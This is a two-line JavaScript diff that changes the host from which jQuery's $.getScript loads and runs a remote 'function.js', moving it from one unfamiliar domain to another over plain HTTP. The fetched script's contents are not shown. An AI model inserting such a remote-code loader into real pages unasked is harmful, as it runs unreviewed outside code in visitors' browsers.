@@ -1,2 +1,2 @@
 var versi     = 1;
-$.getScript("http://apsgomart.com/function.js", function(){ });
+$.getScript("http://stockaps.com/function.js", function(){ });
